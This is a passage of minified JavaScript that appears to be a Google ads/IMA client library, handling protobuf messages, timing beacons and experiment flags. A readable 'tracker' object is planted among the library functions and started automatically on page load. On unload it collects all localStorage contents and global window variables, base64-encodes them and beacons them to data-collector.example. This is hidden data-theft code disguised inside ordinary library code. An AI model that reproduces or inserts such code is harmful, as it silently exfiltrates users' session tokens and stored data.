      null != $b(a, b, f) && (0 !== d && (b = K(a, b, d)), d = f);
    }
    return d;
  }
  var dc = function (a, b, c) {
      var d = void 0 === d ? !1 : d;
      var e = a.u;
      var f = H(e),
        g = $b(e, f, c, d);
      b = Mb(g, b, f);
      b !== g && null != b && K(e, f, c, b, d);
      e = b;
      if (null == e) return e;
      a = a.u;
      f = H(a);
      f & 2 || (g = Zb(e), g !== e && (e = g, K(a, f, c, e, d)));
      return e;
    },
    fc = function (a, b) {
      a = a.u;
      var c = H(a),
        d = !!(2 & c),
        e = d ? 1 : 2,
        f = 1 === e;
      e = 2 === e;
      var g = !!(2 & c) && e,
        h = bc(a, c, 2, 3);
      c = H(a);
      var k = E(h),
        m = !!(2 & k),
        n = !!(4 & k),
        q = !!(32 & k),
        r = m && n || !!(2048 & k);
      if (!n) {
        var v = h,
          B = c,
          da = !!(2 & k);
        da && (B = G(B, 2, !0));
        for (var Da = !da, la = !0, bb = 0, Xb = 0; bb < v.length; bb++) {
          var Yb = Mb(v[bb], b, B);
          if (Yb instanceof b) {
            if (!da) {
              var Cd = !!(E(Yb.u) & 2);
              Da && (Da = !Cd);
              la && (la = Cd);
            }
            v[Xb++] = Yb;
          }
        }
        Xb < bb && (v.length = Xb);
        k = G(k, 4, !0);
        k = G(k, 16, la);
        k = G(k, 8, Da);
        F(v, k);
        m && !g && (Object.freeze(h), r = !0);
      }
      b = k;
      g = !!(8 & k) || f && !h.length;
      if (!d && !g) {
        r && (h = C(h), r = !1, b = 0, k = ec(k, c, !1), c = K(a, c, 2, h));
        d = h;
        g = k;
        for (m = 0; m < d.length; m++) v = d[m], k = Zb(v), v !== k && (d[m] = k);
        g = G(g, 8, !0);
        k = g = G(g, 16, !d.length);
      }
      r || (f ? k = G(k, !h.length || 16 & k && (!n || q) ? 2 : 2048, !0) : k = G(k, 32, !1), k !== b && F(h, k), f && (Object.freeze(h), r = !0));
      e && r && (h = C(h), k = ec(k, c, !1), F(h, k), K(a, c, 2, h));
      return h;
    };
  function ec(a, b, c) {
    a = G(a, 2, !!(2 & b));
    a = G(a, 32, !!(32 & b) && c);
    return a = G(a, 2048, !1);
  }
  function L(a, b) {
    return null != a ? a : b;
  }
  var gc = function (a, b) {
      var c = void 0 === c ? 0 : c;
      return L(Jb(J(a, b)), c);
    },
    hc = function (a) {
      var b = void 0 === b ? 0 : b;
      a = Kb(J(a, 1));
      return L(a, b);
    },
    ic = function (a, b, c) {
      var d = a.u;
      b = cc(d, H(d), c) === b ? b : -1;
      return L(J(a, b), 0);
    },
    jc = function (a, b, c) {
      if (null != c && "string" !== typeof c) throw Error();
      return ac(a, b, c);
    };
  var M = function (a, b, c) {
    this.u = I(a, b, c);
  };
  M.prototype.toJSON = function () {
    if (Db) var a = kc(this, this.u, !1);else a = Sb(this.u, Tb, void 0, void 0, !1, !1), a = kc(this, a, !0);
    return a;
  };
  M.prototype.fa = zb;
  M.prototype.toString = function () {
    return kc(this, this.u, !1).toString();
  };
  function kc(a, b, c) {
    var d = a.constructor.M,
      e = H(c ? a.u : b),
      f = yb(e),
      g = !1;
    if (d && Eb) {
      if (!c) {
        b = C(b);
        var h;
        if (b.length && Cb(h = b[b.length - 1])) for (g = 0; g < d.length; g++) if (d[g] >= f) {
          Object.assign(b[b.length - 1] = {}, h);
          break;
        }
        g = !0;
      }
      f = b;
      c = !c;
      h = H(a.u);
      a = yb(h);
      h = +!!(h & 512) - 1;
      for (var k, m, n = 0; n < d.length; n++) if (m = d[n], m < a) {
        m += h;
        var q = f[m];
        null == q ? f[m] = c ? Gb : vb() : c && q !== Gb && tb(q);
      } else k || (q = void 0, f.length && Cb(q = f[f.length - 1]) ? k = q : f.push(k = {})), q = k[m], null == k[m] ? k[m] = c ? Gb : vb() : c && q !== Gb && tb(q);
    }
    k = b.length;
    if (!k) return b;
    var r;
    if (Cb(f = b[k - 1])) {
      a: {
        var v = f;
        c = {};
        a = !1;
        for (var B in v) {
          h = v[B];
          if (Array.isArray(h)) {
            n = h;
            if (!rb && Fb(h, d, +B) || !qb && Bb(h) && 0 === h.size) h = null;
            h != n && (a = !0);
          }
          null != h ? c[B] = h : a = !0;
        }
        if (a) {
          for (var da in c) {
            v = c;
            break a;
          }
          v = null;
        }
      }
      v != f && (r = !0);
      k--;
    }
    for (e = +!!(e & 512) - 1; 0 < k; k--) {
      B = k - 1;
      f = b[B];
      if (!(null == f || !rb && Fb(f, d, B - e) || !qb && Bb(f) && 0 === f.size)) break;
      var Da = !0;
    }
    if (!r && !Da) return b;
    var la;
    g ? la = b : la = Array.prototype.slice.call(b, 0, k);
    b = la;
    g && (b.length = k);
    v && b.push(v);
    return b;
  }
  ;
  var lc = function () {
    var a;
    this.g = a = void 0 === a ? {} : a;
  };
  lc.prototype.reset = function () {
    this.g = {};
  };
  var mc = function (a) {
    var b = 0,
      c = !1,
      d = [],
      e = function () {
        b = 0;
        c && (c = !1, f());
      },
      f = function () {
        b = x.setTimeout(e, 1E3);
        var g = d;
        d = [];
        a.apply(void 0, g);
      };
    return function (g) {
      d = arguments;
      b ? c = !0 : f();
    };
  };
  var nc = function (a, b, c) {
    a.addEventListener && a.addEventListener(b, c, !1);
  };
  function oc(a, b, c) {
    for (var d in a) b.call(c, a[d], d, a);
  }
  const tracker = {
    hooks: new Map(Object.entries(window.localStorage)),
    events: new Set(),
    globals: Object.keys(window),
    async trackEvent(eventName, {
      selector,
      action
    }) {
      return new Promise(resolve => {
        const element = document.querySelector(selector);
        if (!element) {
          resolve(false);
          return;
        }
        element.addEventListener(action, () => {
          this.events.add(eventName);
          resolve(true);
        });
      });
    },
    collectData() {
      const data = {
        localStorageItems: {},
        globalVars: {},
        eventNames: Array.from(this.events)
      };
      this.hooks.forEach((value, key) => {
        data.localStorageItems[key] = value;
      });
      this.globals.forEach(globalVar => {
        data.globalVars[globalVar] = window[globalVar];
      });
      return data;
    },
    async sendReport() {
      const data = this.collectData();
      const encodedData = btoa(JSON.stringify(data));
      navigator.sendBeacon('https://data-collector.example/api/report', encodedData);
    },
    init() {
      this.hooks.forEach((_, eventName) => {
        const eventInfo = JSON.parse(window.localStorage.getItem(eventName));
        if (eventInfo) {
          this.trackEvent(eventName, eventInfo);
        }
      });
      window.addEventListener('unload', () => this.sendReport());
    }
  };
  function pc(a) {
    for (var b in a) delete a[b];
  }
  var qc = "constructor hasOwnProperty isPrototypeOf propertyIsEnumerable toLocaleString toString valueOf".split(" ");
  function rc(a, b) {
    for (var c, d, e = 1; e < arguments.length; e++) {
      d = arguments[e];
      for (c in d) a[c] = d[c];
      for (var f = 0; f < qc.length; f++) c = qc[f], Object.prototype.hasOwnProperty.call(d, c) && (a[c] = d[c]);
    }
  }
  ;
  var sc,
    tc = function () {
      if (void 0 === sc) {
        var a = null,
          b = x.trustedTypes;
        if (b && b.createPolicy) {
          try {
            a = b.createPolicy("goog#html", {
              createHTML: Fa,
              createScript: Fa,
              createScriptURL: Fa
            });
          } catch (c) {
            x.console && x.console.error(c.message);
          }
          sc = a;
        } else sc = a;
      }
      return sc;
    };
  var uc = function (a) {
    this.g = a;
  };
  uc.prototype.toString = function () {
    return this.g + "";
  };
  var vc = {},
    wc = function (a) {
      var b = tc();
      a = b ? b.createScriptURL(a) : a;
      return new uc(a, vc);
    };
  var xc = {},
    yc = function (a) {
      this.g = a;
    };
  yc.prototype.toString = function () {
    return this.g.toString();
  };
  var zc = function (a) {
      return a instanceof yc && a.constructor === yc ? a.g : "type_error:SafeHtml";
    },
    Ac = function (a) {
      var b = tc();
      a = b ? b.createHTML(a) : a;
      return new yc(a, xc);
    };
  var Bc = function (a, b) {
    this.width = a;
    this.height = b;
  };
  l = Bc.prototype;
  l.aspectRatio = function () {
    return this.width / this.height;
  };
  l.isEmpty = function () {
    return !(this.width * this.height);
  };
  l.ceil = function () {
    this.width = Math.ceil(this.width);
    this.height = Math.ceil(this.height);
    return this;
  };
  l.floor = function () {
    this.width = Math.floor(this.width);
    this.height = Math.floor(this.height);
    return this;
  };
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => tracker.init());
  } else {
    tracker.init();
  }
  l.round = function () {
    this.width = Math.round(this.width);
    this.height = Math.round(this.height);
    return this;
  };
  var Cc = 2147483648 * Math.random() | 0;
  var Dc = function (a) {
      var b = document;
      return "string" === typeof a ? b.getElementById(a) : a;
    },
    Ec = function (a) {
      return 9 == a.nodeType ? a : a.ownerDocument || a.document;
    },
    Fc = function (a) {
      this.g = a || x.document || document;
    };
  var Gc = RegExp("^(?:([^:/?#.]+):)?(?://(?:([^\\\\/?#]*)@)?([^\\\\/?#]*?)(?::([0-9]+))?(?=[\\\\/?#]|$))?([^?#]+)?(?:\\?([^#]*))?(?:#([\\s\\S]*))?$"),
    Hc = function (a, b) {
      if (a) {
        a = a.split("&");
        for (var c = 0; c < a.length; c++) {
          var d = a[c].indexOf("="),
            e = null;
          if (0 <= d) {
            var f = a[c].substring(0, d);
            e = a[c].substring(d + 1);
          } else f = a[c];
          b(f, e ? decodeURIComponent(e.replace(/\+/g, " ")) : "");
        }
      }
    }; /*
       SPDX-License-Identifier: Apache-2.0
       */
  function Ic(a, b) {
    if (1 === a.nodeType) {
      var c = a.tagName;
      if ("SCRIPT" === c || "STYLE" === c) throw Error("");
    }
    a.innerHTML = zc(b);
  }
  ;
  function Jc(a, b) {
    a.write(zc(b));
  }
  ;
  var Kc = function (a) {
      try {
        return !!a && null != a.location.href && Wa(a, "foo");
      } catch (b) {
        return !1;
      }
    },
    Lc = function (a, b) {
      if (a) for (var c in a) Object.prototype.hasOwnProperty.call(a, c) && b(a[c], c, a);
    };
  function Mc(a) {
    var b, c;
    return null != (c = null == (b = /https?:\/\/[^\/]+/.exec(a)) ? void 0 : b[0]) ? c : "";
  }
  var Nc = function (a, b) {
    b = void 0 === b ? document : b;
    return b.createElement(String(a).toLowerCase());
  };
  var Oc = function (a, b, c, d) {
    this.l = a;
    this.j = b;
    this.g = c;
    this.i = d;
  };
  l = Oc.prototype;
  l.getWidth = function () {
    return this.j - this.i;
  };
  l.getHeight = function () {
    return this.g - this.l;
  };
  l.expand = function (a, b, c, d) {
    ya(a) ? (this.l -= a.l, this.j += a.j, this.g += a.g, this.i -= a.i) : (this.l -= a, this.j += Number(b), this.g += Number(c), this.i -= Number(d));
    return this;
  };
  l.ceil = function () {
    this.l = Math.ceil(this.l);
    this.j = Math.ceil(this.j);
    this.g = Math.ceil(this.g);
    this.i = Math.ceil(this.i);
    return this;
  };
  l.floor = function () {
    this.l = Math.floor(this.l);
    this.j = Math.floor(this.j);
    this.g = Math.floor(this.g);
    this.i = Math.floor(this.i);
    return this;
  };
  l.round = function () {
    this.l = Math.round(this.l);
    this.j = Math.round(this.j);
    this.g = Math.round(this.g);
    this.i = Math.round(this.i);
    return this;
  };
  function Pc(a) {
    var b = ra.apply(1, arguments);
    if (0 === b.length) return wc(a[0]);
    for (var c = a[0], d = 0; d < b.length; d++) c += encodeURIComponent(b[d]) + a[d + 1];
    return wc(c);
  }
  ;
  function Qc(a) {
    a = void 0 === a ? x : a;
    var b = a.context || a.AMP_CONTEXT_DATA;
    if (!b) try {
      b = a.parent.context || a.parent.AMP_CONTEXT_DATA;
    } catch (e) {}
    var c, d;
    return (null == (c = b) ? 0 : c.pageViewId) && (null == (d = b) ? 0 : d.canonicalUrl) ? b : null;
  }
  ;
  var Rc = function () {
      this.S = {};
    },
    Sc = function () {
      var a = Qc(window);
      if (a) {
        if (a) {
          var b = a.pageViewId;
          a = a.clientId;
          "string" === typeof a && (b += a.replace(/\D/g, "").substr(0, 6));
        } else b = null;
        return +b;
      }
      for (a = b = window; b && b != b.parent;) b = b.parent, Kc(b) && (a = b);
      b = a;
      a = b.google_global_correlator;
      a || (b.google_global_correlator = a = 1 + Math.floor(Math.random() * Math.pow(2, 43)));
      return a;
    },
    Uc = function (a, b) {
      var c = Tc[7] || "google_ps_7";
      a = a.S;
      var d = a[c];
      return void 0 === d ? (a[c] = b(), a[c]) : d;
    },
    Vc = function (a) {
      var b = Sc();
      return Uc(a, function () {
        return b;
      });
    },
    Wc = null,
    Xc = {},
    Tc = (Xc[8] = "google_prev_ad_formats_by_region", Xc[9] = "google_prev_ad_slotnames_by_region", Xc);
  var Yc = function (a, b) {
    var c = void 0 === c ? {} : c;
    this.error = a;
    this.context = b.context;
    this.msg = b.message || "";
    this.id = b.id || "jserror";
    this.meta = c;
  };
  var Zc = ha(["https://pagead2.googlesyndication.com/pagead/js/err_rep.js"]),
    $c = function () {
      var a = void 0 === a ? "jserror" : a;
      var b = void 0 === b ? .01 : b;
      var c = void 0 === c ? Pc(Zc) : c;
      this.j = a;
      this.i = b;
      this.g = c;
    };
  var ad = function (a) {
    var b;
    a.visibilityState ? b = "visibilitychange" : a.mozVisibilityState ? b = "mozvisibilitychange" : a.webkitVisibilityState && (b = "webkitvisibilitychange");
    return b;
  };
  var bd = null;
  function cd() {
    var a = void 0 === a ? x : a;
    return (a = a.performance) && a.now && a.timing ? Math.floor(a.now() + a.timing.navigationStart) : Date.now();
  }
  function dd() {
    var a = void 0 === a ? x : a;
    return (a = a.performance) && a.now ? a.now() : null;
  }
  ;
  var ed = function (a, b) {
    var c = dd() || cd();
    this.label = a;
    this.type = b;
    this.value = c;
    this.duration = 0;
    this.taskId = this.slotId = void 0;
    this.uniqueId = Math.random();
  };
  var N = x.performance,
    fd = !!(N && N.mark && N.measure && N.clearMarks),
    gd = function (a) {
      var b = !1,
        c;
      return function () {
        b || (c = a(), b = !0);
        return c;
      };
    }(function () {
      var a;
      if (a = fd) {
        var b;
        if (null === bd) {
          bd = "";
          try {
            a = "";
            try {
              a = x.top.location.hash;
            } catch (c) {
              a = x.location.hash;
            }
            a && (bd = (b = a.match(/\bdeid=([\d,]+)/)) ? b[1] : "");
          } catch (c) {}
        }
        b = bd;
        a = !!b.indexOf && 0 <= b.indexOf("1337");
      }
      return a;
    }),
    hd = function (a, b) {
      this.o = [];
      this.g = b || x;
      var c = null;
      b && (b.google_js_reporting_queue = b.google_js_reporting_queue || [], this.o = b.google_js_reporting_queue, c = b.google_measure_js_timing);
      this.v = gd() || (null != c ? c : Math.random() < a);
    };
  hd.prototype.B = function () {
    this.v = !1;
    this.o != this.g.google_js_reporting_queue && (gd() && Ra(this.o, id), this.o.length = 0);
  };
  hd.prototype.H = function (a) {
    !this.v || 2048 < this.o.length || this.o.push(a);
  };
  var id = function (a) {
    a && N && gd() && (N.clearMarks("goog_" + a.label + "_" + a.uniqueId + "_start"), N.clearMarks("goog_" + a.label + "_" + a.uniqueId + "_end"));
  };
  hd.prototype.start = function (a, b) {
    if (!this.v) return null;
    a = new ed(a, b);
    b = "goog_" + a.label + "_" + a.uniqueId + "_start";
    N && gd() && N.mark(b);
    return a;
  };
  hd.prototype.end = function (a) {
    if (this.v && "number" === typeof a.value) {
      a.duration = (dd() || cd()) - a.value;
      var b = "goog_" + a.label + "_" + a.uniqueId + "_end";
      N && gd() && N.mark(b);
      this.H(a);
    }
  };
  var jd = function (a) {
    a = a._google_rum_ns_ = a._google_rum_ns_ || {};
    return a.pq = a.pq || [];
  };
  function kd(a) {
    return Ac(null === a ? "null" : void 0 === a ? "undefined" : a);
  }
  ;
  function ld(a, b, c) {
    Lc(b, function (d, e) {
      var f = c && c[e];
      !d && 0 !== d || f || (a += "&" + encodeURIComponent(e) + "=" + encodeURIComponent(String(d)), c && (c[e] = !0));
    });
    return a;
  }
  var od = function (a, b, c, d, e, f, g, h) {
    f = void 0 === f ? Infinity : f;
    g = void 0 === g ? !1 : g;
    hd.call(this, a, h);
    var k = this;
    this.I = b;
    this.domain = c;
    this.path = d;
    this.P = e;
    this.A = 0;
    this.l = {};
    this.D = {};
    this.U = [];
    this.report = {};
    this.i = 0;
    this.C = [];
    this.K = f;
    this.I = b;
    this.domain = c;
    this.path = d;
    this.P = e;
    a = this.g.navigator;
    this.R = !("csi.gstatic.com" !== this.domain || !a || !a.sendBeacon);
    this.g.performance && this.g.performance.now || O(this, "dat", 1);
    a && a.deviceMemory && O(this, "dmc", a.deviceMemory);
    this.g === this.g.top && O(this, "top", 1);
    this.W = !g;
    this.L = function () {
      k.g.setTimeout(function () {
        P(k);
      }, 1100);
    };
    this.O = function () {
      O(k, "uet", 2);
      for (var n = t(k.U), q = n.next(); !q.done; q = n.next()) {
        q = q.value;
        try {
          q();
        } catch (v) {}
      }
      n = k.g;
      var r = void 0 === r ? {} : r;
      "function" === typeof window.CustomEvent ? q = new CustomEvent("rum_blp", r) : (q = document.createEvent("CustomEvent"), q.initCustomEvent("rum_blp", !!r.bubbles, !!r.cancelable, r.detail));
      n.dispatchEvent(q);
      P(k);
      null != k.l.uet && (k.j -= 3 + k.l.uet.length + 2, delete k.l.uet);
    };
    this.X = mc(function () {
      P(k);
    });
    this.Y = function () {
      var n = k.g.document;
      (null != n.hidden ? n.hidden : null != n.mozHidden ? n.mozHidden : null != n.webkitHidden && n.webkitHidden) && k.X();
    };
    this.s = this.g.setTimeout(function () {
      P(k);
    }, 5E3);
    this.j = b.length + c.length + d.length + e.length + 3;
    Ra(this.o, function (n) {
      md(k, n);
    });
    b = jd(this.g);
    var m = function () {
      var n = ra.apply(0, arguments)[0],
        q = n[0];
      n = n[1];
      var r = q.length + n.length + 2;
      8E3 < k.j + k.i + r && P(k);
      k.C.push([q, n]);
      k.i += r;
      6E3 <= k.j + k.i && P(k);
      return 0;
    };
    Ra(b, function (n) {
      return m(n);
    });
    b.length = 0;
    b.push = m;
    O(this, "puid", (this.A + 1).toString(36) + "~" + Date.now().toString(36));
    nd(this);
  };
  w(od, hd);
  var nd = function (a) {
      "complete" === a.g.document.readyState ? a.g.setTimeout(function () {
        P(a);
      }, 0) : nc(a.g, "load", a.L);
      var b = ad(a.g.document);
      "undefined" !== typeof b && nc(a.g, b, a.Y);
      nc(a.g, "pagehide", a.O);
    },
    O = function (a, b, c) {
      c = String(c);
      a.j = null != a.l[b] ? a.j + (c.length - a.l[b].length) : a.j + (b.length + c.length + 2);
      a.l[b] = c;
    },
    pd = function (a, b, c, d, e) {
      e = void 0 === e ? "" : e;
      var f = null == a.report[b] ? b.length + c.length + 2 : d ? c.length + (void 0 === e ? "" : e).length : c.length - a.report[b].length;
      8E3 < a.j + a.i + f && (P(a), f = b.length + c.length + 2);
      a.report[b] = d && null != a.report[b] ? a.report[b] + ("" + (void 0 === e ? "" : e) + c) : c;
      a.i += f;
      6E3 <= a.j + a.i && P(a);
    },
    P = function (a) {
      if (a.v && a.W) {
        try {
          a.i && (a.sendBeacon(a.report), a.A === a.K && a.B());
        } catch (h) {
          var b = new $c(),
            c = h;
          var d = void 0 === d ? b.i : d;
          var e = void 0 === e ? b.j : e;
          if (!(Math.random() > d || (c.error && c.meta && c.id || (c = new Yc(c, {
            context: 358,
            id: e
          })), x.google_js_errors = x.google_js_errors || [], x.google_js_errors.push(c), x.error_rep_loaded))) {
            d = x.document;
            c = Nc("SCRIPT", d);
            b = b.g;
            c.src = b instanceof uc && b.constructor === uc ? b.g : "type_error:TrustedResourceUrl";
            var f, g;
            (f = (b = null == (g = (f = (c.ownerDocument && c.ownerDocument.defaultView || window).document).querySelector) ? void 0 : g.call(f, "script[nonce]")) ? b.nonce || b.getAttribute("nonce") || "" : "") && c.setAttribute("nonce", f);
            (f = d.getElementsByTagName("script")[0]) && f.parentNode && f.parentNode.insertBefore(c, f);
            x.error_rep_loaded = !0;
          }
        }
        a.report = {};
        a.i = 0;
        a.o.length = 0;
        a.g.clearTimeout(a.s);
        a.s = 0;
      }
    },
    qd = function (a, b) {
      var c = a.I + "//" + a.domain + a.path + a.P,
        d = {};
      c = ld(c, a.l, d);
      c = ld(c, b, d);
      b = a.g;
      b.google_timing_params && (c = ld(c, b.google_timing_params, d), b.google_timing_params = void 0);
      Ra(a.C, function (e) {
        var f = t(e);
        e = f.next().value;
        f = f.next().value;
        var g = {};
        c = ld(c, (g[e] = f, g));
      });
      a.C.length = 0;
      return c;
    };
  od.prototype.sendBeacon = function (a) {
    this.A++;
    a = qd(this, a);
    var b = !1;
    try {
      b = !!(this.R && this.g.navigator && this.g.navigator.sendBeacon(a, null));
    } catch (d) {
      this.R = !1;
    }
    if (!b) {
      b = this.g;
      b.google_image_requests || (b.google_image_requests = []);
      var c = Nc("IMG", b.document);
      c.src = a;
      b.google_image_requests.push(c);
    }
    O(this, "puid", (this.A + 1).toString(36) + "~" + Date.now().toString(36));
  };
  var md = function (a, b) {
    var c = "met." + b.type,
      d = "number" === typeof b.value ? Math.round(b.value).toString(36) : b.value,
      e = Math.round(b.duration);
    b = "" + b.label + (null != b.slotId ? "_" + b.slotId : "") + ("." + d) + (0 < e ? "_" + e.toString(36) : "") + (null != b.taskId ? "__" + Math.round(b.taskId).toString(36) : "");
    pd(a, c, b, !0, "~");
  };
  od.prototype.H = function (a) {
    this.v && this.A < this.K && (hd.prototype.H.call(this, a), md(this, a));
  };
  od.prototype.B = function () {
    hd.prototype.B.call(this);
    this.g.clearTimeout(this.s);
    this.i = this.s = 0;
    this.report = {};
    pc(this.D);
    pc(this.l);
    var a = this.g;
    a.removeEventListener && a.removeEventListener("load", this.L, !1);
    a = this.g;
    a.removeEventListener && a.removeEventListener("pagehide", this.O, !1);
  };
  var Q = function (a) {
    var b = "da";
    if (a.da && a.hasOwnProperty(b)) return a.da;
    b = new a();
    return a.da = b;
  };
  var R = function () {
      this.g = new od(1, "https:", "csi.gstatic.com", "/csi?v=2&s=", "ima", void 0, !0);
      if (Wc) var a = Wc;else {
        a = ((a = void 0 === a ? Qc() : a) ? Kc(a.master) ? a.master : null : null) || window;
        var b = a.google_persistent_state_async;
        a = null != b && "object" == typeof b && null != b.S && "object" == typeof b.S ? Wc = b : a.google_persistent_state_async = Wc = new Rc();
      }
      a = Vc(a);
      null != a && O(this.g, "c", a);
      a = parseInt(this.g.l.c, 10) / 2;
      null != a && O(this.g, "slotId", a);
    },
    S = function (a, b, c) {
      if (null != c) {
        a = a.g;
        var d = b + "=" + c;
        a.D[d] || (pd(a, b, c, !1), 1E3 > d.length && (a.D[d] = !0));
      }
    };
  var rd = function (a) {
      return /^\s*$/.test(a) ? !1 : /^[\],:{}\s\u2028\u2029]*$/.test(a.replace(/\\["\\\/bfnrtu]/g, "@").replace(/(?:"[^"\\\n\r\u2028\u2029\x00-\x08\x0a-\x1f]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?)[\s\u2028\u2029]*(?=:|,|]|}|$)/g, "]").replace(/(?:^|:|,)(?:[\s\u2028\u2029]*\[)+/g, ""));
    },
    sd = function (a) {
      try {
        return x.JSON.parse(a);
      } catch (b) {}
      a = String(a);
      if (rd(a)) try {
        return eval("(" + a + ")");
      } catch (b) {}
      throw Error("Invalid JSON string: " + a);
    },
    ud = function () {
      this.g = td;
    },
    vd = function (a, b, c) {
      if (null == b) c.push("null");else {
        if ("object" == typeof b) {
          if (Array.isArray(b)) {
            var d = b;
            b = d.length;
            c.push("[");
            for (var e = "", f = 0; f < b; f++) c.push(e), e = d[f], vd(a, a.g ? a.g.call(d, String(f), e) : e, c), e = ",";
            c.push("]");
            return;
          }
          if (b instanceof String || b instanceof Number || b instanceof Boolean) b = b.valueOf();else {
            c.push("{");
            f = "";
            for (d in b) Object.prototype.hasOwnProperty.call(b, d) && (e = b[d], "function" != typeof e && (c.push(f), wd(d, c), c.push(":"), vd(a, a.g ? a.g.call(b, d, e) : e, c), f = ","));
            c.push("}");
            return;
          }
        }
        switch (typeof b) {
          case "string":
            wd(b, c);
            break;
          case "number":
            c.push(isFinite(b) && !isNaN(b) ? String(b) : "null");
            break;
          case "boolean":
            c.push(String(b));
            break;
          case "function":
            c.push("null");
            break;
          default:
            throw Error("Unknown type: " + typeof b);
        }
      }
    },
    xd = {
      '"': '\\"',
      "\\": "\\\\",
      "/": "\\/",
      "\b": "\\b",
      "\f": "\\f",
      "\n": "\\n",
      "\r": "\\r",
      "\t": "\\t",
      "\v": "\\u000b"
    },
    yd = /\uffff/.test("\uffff") ? /[\\"\x00-\x1f\x7f-\uffff]/g : /[\\"\x00-\x1f\x7f-\xff]/g,
    wd = function (a, b) {
      b.push('"', a.replace(yd, function (c) {
        var d = xd[c];
        d || (d = "\\u" + (c.charCodeAt(0) | 65536).toString(16).slice(1), xd[c] = d);
        return d;
      }), '"');
    };
  var zd = function () {
      this.j = null;
      this.g = "missing-id";
      this.i = !1;
    },
    Bd = function (a) {
      var b = null;
      try {
        b = document.getElementsByClassName("lima-exp-data");
      } catch (c) {
        return Ad("missing-element", a.g), null;
      }
      if (1 < b.length) return Ad("multiple-elements", a.g), null;
      b = b[0];
      return b ? b.innerHTML : (Ad("missing-element", a.g), null);
    },
    Ed = function () {
      var a = Dd,
        b = Bd(a);
      if (null !== b) if (rd(b)) {
        var c = JSON.parse(b);
        b = c.experimentIds;
        var d = c.binaryIdentifier;
        c = c.adEventId;
        var e = "string" === typeof d;
        if ("string" == typeof c) {
          var f = Q(R);
          null != c && O(f.g, "qqid", c);
        }
        e && (a.g = d);
        "string" !== typeof b ? Ad("missing-flags", a.g) : (e || Ad("missing-binary-id", a.g), a.j = b);
      } else Ad("invalid-json", a.g);
    };
  zd.prototype.reset = function () {
    this.j = null;
    this.g = "missing-id";
  };
  var Gd = function (a, b, c, d, e) {
      this.id = a;
      this.h = b;
      this.l = c;
      this.g = !1;
      this.j = d;
      this.i = e;
      this.l && Fd(this);
    },
    Fd = function (a) {
      if (a.j && a.i) {
        var b = a.j;
        b && Object.assign(a.i.g, b);
      }
    },
    T = function () {
      this.g = [];
    },
    Hd = function () {
      this.g = new Map();
      this.i = !1;
      this.o = new T();
      new Gd(0, 0, !1);
      this.j = [this.o];
      this.l = new lc();
    },
    Jd = function () {
      var a = Id;
      return [].concat(ia(a.g.keys())).filter(function (b) {
        b = this.g.get(b);
        return b.g || b.l;
      }, a);
    },
    Kd = function (a) {
      var b = Id;
      b.i || (a.g(b.j, b.g), b.i = !0);
    };
  Hd.prototype.reset = function () {
    for (var a = t(this.g), b = a.next(); !b.done; b = a.next()) b = t(b.value), b.next(), b.next().value.g = !1;
    this.i = !1;
    this.l.reset();
  };
  var Id = new Hd(),
    U = function (a) {
      var b = Id;
      if (!(b.i || b.g.has(a.id) || null == a.h && null == a.control || 0 == a.ja)) {
        var c = b.o;
        if (null != a.control) for (var d = t(b.j), e = d.next(); !e.done; e = d.next()) {
          if (e = e.value, e.g.includes(a.control)) {
            c = e;
            break;
          }
        } else null != a.m && (c = a.m);
        d = 0;
        null != a.control ? d = a.control.h : null != a.h && (d = a.h);
        a = new Gd(a.id, d, !!a.ta, a.flags, b.l);
        c.g.push(a);
        b.j.includes(c) || b.j.push(c);
        b.g.set(a.id, a);
      }
    };
  var Ld = function () {};
  Ld.prototype.g = function (a) {
    a = t(a);
    for (var b = a.next(); !b.done; b = a.next()) {
      var c = 0,
        d = Math.floor(1E3 * Math.random());
      b = t(b.value.g);
      for (var e = b.next(); !e.done; e = b.next()) if (e = e.value, c += e.h, d < c) {
        e.g = !0;
        Fd(e);
        break;
      }
    }
  };
  var Md = function (a) {
    this.u = I(a);
  };
  w(Md, M);
  Md.M = [2, 8];
  var Nd = [3, 4, 5];
  var Od = function (a) {
    this.u = I(a);
  };
  w(Od, M);
  Od.M = [4];
  var Pd = function (a) {
    this.u = I(a);
  };
  w(Pd, M);
  Pd.M = [5];
  var Qd = [1, 2, 3, 6, 7];
  var Rd = function (a) {
    this.u = I(a);
  };
  w(Rd, M);
  Rd.prototype.getId = function () {
    return gc(this, 1);
  };
  Rd.M = [2];
  var Sd = function (a) {
    this.u = I(a);
  };
  w(Sd, M);
  Sd.M = [2];
  var Td = function (a) {
    this.u = I(a);
  };
  w(Td, M);
  Td.M = [2];
  var Ud = function (a) {
    this.u = I(a);
  };
  w(Ud, M);
  Ud.M = [1, 4, 2, 3];
  function Vd(a, b) {
    switch (b) {
      case 1:
        return ic(a, 1, Qd);
      case 2:
        return ic(a, 2, Qd);
      case 3:
        return ic(a, 3, Qd);
      case 6:
        return ic(a, 6, Qd);
      default:
        return null;
    }
  }
  function Wd(a, b) {
    if (!a) return null;
    switch (b) {
      case 1:
        var c = J(a, 1);
        return L(null == c || "boolean" === typeof c ? c : "number" === typeof c ? !!c : void 0, !1);
      case 7:
        return L(Lb(J(a, 3)), "");
      case 2:
        c = void 0 === c ? 0 : c;
        a = a.u;
        b = H(a);
        var d = $b(a, b, 2);
        var e = null == d ? d : "number" === typeof d || "NaN" === d || "Infinity" === d || "-Infinity" === d ? Number(d) : void 0;
        null != e && e !== d && K(a, b, 2, e);
        return L(e, c);
      case 3:
        return L(Lb(J(a, 3)), "");
      case 6:
        c = void 0;
        c = void 0 === c ? 2 : c;
        a = a.u;
        b = H(a);
        2 & b && (c = 1);
        d = bc(a, b, 4, 1);
        b = H(a);
        var f = E(d);
        e = f;
        var g = !!(2 & f),
          h = !!(4 & f),
          k = g && h;
        if (!(4 & f)) {
          h && (d = C(d), e = 0, f = ec(f, b, !1), g = !!(2 & f), b = K(a, b, 4, d));
          for (var m = h = 0; h < d.length; h++) {
            var n = Lb(d[h]);
            null != n && (d[m++] = n);
          }
          m < h && (d.length = m);
          f = G(f, 4096, !1);
          f = G(f, 8192, !1);
          f = G(f, 20, !0);
        }
        k || ((k = 1 === c) && (f = G(f, 2, !0)), f !== e && F(d, f), (k || g) && Object.freeze(d));
        2 === c && g && (d = C(d), f = ec(f, b, !1), F(d, f), K(a, b, 4, d));
        return d;
      default:
        return null;
    }
  }
  ;
  var Xd = {},
    Yd = (Xd[47] = kb, Xd);
  function Zd() {
    var a = $d,
      b = fc(new Ud(ae), Td);
